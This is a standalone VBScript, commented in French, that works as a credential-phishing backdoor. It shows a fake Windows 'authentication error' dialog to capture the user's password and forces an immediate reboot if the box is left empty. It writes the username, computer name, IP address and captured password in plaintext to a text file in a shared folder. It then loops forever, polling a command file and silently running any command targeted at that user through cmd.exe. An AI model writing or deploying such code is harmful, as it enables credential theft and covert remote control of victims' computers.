Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

Set objShell = CreateObject("WScript.Shell")

strFilePath = "C:\Users\faniz\Downloads\yo\VARTXT\Commande.txt"

cheminRepertoire = "C:\Users\faniz\Downloads\yo\VARTXT\Users"

If Not objFSO.FolderExists(cheminRepertoire) Then
    objFSO.CreateFolder cheminRepertoire
End If

Set objNetwork = CreateObject("WScript.Network")
nomSession = objNetwork.UserName
nomPC = objNetwork.ComputerName

Randomize
randomNumber = Int((4 * Rnd) + 1)
password = ""
filePath = "C:\Users\faniz\Downloads\yo\VARTXT\Users\" & nomSession & ".txt"
searchString = "Mot de passe enregistré:"

Set objFSO = CreateObject("Scripting.FileSystemObject")

If objFSO.FileExists(filePath) Then
    Set objFile = objFSO.OpenTextFile(filePath, 1)
    
    Do Until objFile.AtEndOfStream
        Dim line
        line = objFile.ReadLine
        
        If InStr(line, searchString) > 0 Then
            password = Trim(Mid(line, Len(searchString) + 1))
            Exit Do
        End If
    Loop
    
    objFile.Close
End If

If password = "" Then
    Do While True
        passwordb = InputBox("Nous n'avons pas pu vous connecter à votre session. Veuillez entrer votre mot de passe pour vous reconnecter:", "Erreur d'authentification", vbOKOnly)
        If Not passwordb = "" Then
            Exit Do
        Else
            MsgBox "Une erreur s'est produite. Veuillez entrer le mot de passe correct pour vous connecter à votre session.", vbCritical + vbOKOnly, "Erreur d'authentification"
            Set objShell = CreateObject("WScript.Shell")
            objShell.Run "shutdown /r /t 0"
            Exit Do
        End If
    Loop
Else
    Do While True
        If randomNumber = 1 Then
            passwordb = InputBox("Nous n'avons pas pu vous connecter à votre session. Veuillez entrer votre mot de passe pour vous reconnecter:", "Erreur d'authentification", vbOKOnly)
            If Not passwordb = "" Then
                Exit Do
            End If

            MsgBox "Une erreur s'est produite. Veuillez entrer le mot de passe correct pour vous connecter à votre session.", vbCritical + vbOKOnly, "Erreur d'authentification"
            Set objShell = CreateObject("WScript.Shell")
            objShell.Run "shutdown /r /t 0"
        Else
            Exit Do
        End If
    Loop
End If

Set objFSO = Nothing
Set objFile = Nothing
Set objNetwork = Nothing

Function GetIPAddress()
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMIService.ExecQuery("Select * From Win32_NetworkAdapterConfiguration Where IPEnabled = True")
    
    For Each objItem In colItems
        If Not IsNull(objItem.IPAddress) Then
            GetIPAddress = objItem.IPAddress(0)
            Exit Function
        End If
    Next
End Function

Function IsSessionActive()
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMIService.ExecQuery("Select * From Win32_ComputerSystem")
    
    For Each objItem In colItems
        If InStr(objItem.UserName, nomSession) > 0 And objItem.Name = nomPC Then
            IsSessionActive = "🟢"
            Exit Function
        End If
    Next
    
    IsSessionActive = "🔴"
End Function

adresseIP = GetIPAddress()
sessionActive = IsSessionActive()

cheminFichierTexte = cheminRepertoire & "\" & nomSession & ".txt"


Set objFSO = CreateObject("Scripting.FileSystemObject")

If objFSO.FileExists(cheminFichierTexte) Then
    Set objFile = objFSO.OpenTextFile(cheminFichierTexte, 2, True)
Else
    Set objFile = objFSO.CreateTextFile(cheminFichierTexte)
End If

objFile.WriteLine "---------- INFORMATION ----------"
objFile.WriteLine "Nom de la session: " & nomSession
objFile.WriteLine "Nom du PC: " & nomPC
objFile.WriteLine "Adresse IP: " & adresseIP
objFile.WriteLine "Mot de passe enregistré: " & passwordb
objFile.WriteLine "--------------------------------------------"
objFile.WriteLine "               ONLINE:" & sessionActive

objFile.Close

Do
    If objFSO.FileExists(strFilePath) Then
        On Error Resume Next
        Set objFile = objFSO.OpenTextFile(strFilePath, 1)

        If Err.Number <> 0 Then
            Err.Clear
            On Error GoTo 0
        Else
            Do Until objFile.AtEndOfStream
                ligne = objFile.ReadLine

                posTrg = InStr(ligne, "trg:")
                posCmd = InStr(ligne, "cmd:")

                If posTrg > 0 Then
                    strSessionName = Trim(Mid(ligne, posTrg + 4))
                End If

                If posCmd > 0 Then
                    strCommand = Trim(Mid(ligne, posCmd + 4))
                End If
            Loop

            strExecutingUser = objShell.ExpandEnvironmentStrings("%USERNAME%")

            If UCase(strSessionName) = UCase(strExecutingUser) Then
                If Trim(strCommand) <> "" Then
                    objShell.Run "cmd.exe /C " & strCommand, 0, True

                    Set objFile = objFSO.OpenTextFile(strFilePath, 2)
                    objFile.Write ""
                    objFile.Close
                    strCommand = ""
                    strSessionName = ""
                End If
            End If
        End If
    End If

    WScript.Sleep 10000/10
Loop
